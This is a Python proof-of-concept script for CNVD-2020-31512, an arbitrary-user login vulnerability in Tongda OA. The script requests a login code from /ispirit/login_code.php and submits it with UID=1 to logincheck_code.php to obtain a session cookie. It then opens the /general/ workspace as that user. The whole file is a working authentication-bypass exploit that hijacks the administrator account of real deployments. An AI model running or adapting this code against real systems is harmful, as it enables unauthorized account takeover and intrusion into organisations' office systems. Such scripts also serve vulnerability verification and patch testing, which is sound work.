# title: 通达OA前台存在任意用户登录漏洞
# author: jgz
# cnvd-id: CNVD-2020-31512


from poctools import BasicPoc
import requests
import json


class CNVD_2020_31512(BasicPoc):
    def __init__(self):
        super(CNVD_2020_31512, self).__init__()
        self.name = ""
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Aoyou/biEzMm5kNDRrWTcgazFsTEFTYejkYHK-l5UHLC1JPOhy_B1sefJvAsiTZA=='}
        self.timeout = 20

    def verify(self, url: str) -> bool:
        target = url.strip("/")
        target_1 = f'{target}/ispirit/login_code.php'
        target_2 = f'{target}/logincheck_code.php'
        target_3 = f'{target}/general/'
        try:
            response = requests.get(target_1, headers=self.headers, timeout=self.timeout, verify=False)
            if response.status_code == 200 and "codeuid" in response.text:
                result = json.loads(response.text)
                codeuid = result["codeuid"]
                data = "UID=1&CODEUID=_PC" + codeuid
                headers = {
                    'Content-Type': "application/x-www-form-urlencoded",
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0'
                }
                response_2 = requests.post(target_2, data=data, headers=headers, timeout=self.timeout, verify=False)
                if response_2.status_code == 200 and "general" in response_2.text:
                    cookie = response_2.headers["Set-Cookie"]
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
                        "Cookie": cookie
                    }
                    response_3 = requests.get(target_3, headers=headers, timeout=self.timeout, verify=False)
                    print(response_3.text)
                    if response_3.status_code == 200 \
                            and "工作台" in response_3.text \
                            and "在线" in response_3.text:
                        return True
        except Exception as err:
            pass
        return False


if __name__ == '__main__':
    url = "http://127.0.0.1"
    poc = CNVD_2020_31512()
    result = poc.run(url)
    print(f"{url} -> {result}")
